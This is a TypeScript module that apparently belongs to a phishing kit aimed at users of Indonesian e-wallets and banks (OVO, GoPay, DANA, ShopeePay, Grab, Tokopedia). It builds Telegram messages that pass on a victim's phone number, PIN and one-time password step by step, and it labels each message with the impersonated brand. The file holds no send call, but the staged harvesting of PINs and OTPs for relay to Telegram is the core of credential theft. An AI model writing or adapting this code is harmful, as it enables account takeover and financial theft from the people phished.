import type { EnterpriseStepData } from './types';
import { TELEGRAM_SEPARATOR, telegramField } from './telegram-layout';

export type EnterpriseTelegramProduct =
  | 'ovo'
  | 'gopay'
  | 'dana'
  | 'shopeepay'
  | 'bank'
  | 'grab'
  | 'tokped';

export const ENTERPRISE_TELEGRAM_PRODUCTS: EnterpriseTelegramProduct[] = [
  'ovo',
  'gopay',
  'dana',
  'shopeepay',
  'bank',
  'grab',
  'tokped',
];

const PRODUCT_LABELS: Record<EnterpriseTelegramProduct, string> = {
  ovo: 'OVO',
  gopay: 'GoPay by GoJek',
  dana: 'DANA',
  shopeepay: 'ShopeePay',
  bank: 'Tabungan Bank',
  grab: 'Grab',
  tokped: 'TokPed',
};

export function isEnterpriseTelegramProduct(
  value: string | undefined
): value is EnterpriseTelegramProduct {
  return Boolean(value && value in PRODUCT_LABELS);
}

export function buildEnterpriseTelegramMessage(
  product: EnterpriseTelegramProduct,
  step: 1 | 2 | 3,
  stepData: EnterpriseStepData
): string {
  const label = PRODUCT_LABELS[product];
  const lines = [`<b>${label}</b>`, TELEGRAM_SEPARATOR];

  if (step >= 1 && stepData.phone) {
    lines.push(telegramField('Nomor HP', `<code>${stepData.phone}</code>`));
  }
  if (step >= 2 && stepData.pin) {
    lines.push(telegramField('PIN', `<code>${stepData.pin}</code>`));
  }
  if (step >= 3 && stepData.otp) {
    lines.push(telegramField('OTP', `<code>${stepData.otp}</code>`));
  }

  lines.push(TELEGRAM_SEPARATOR);

  return lines.join('\n');
}
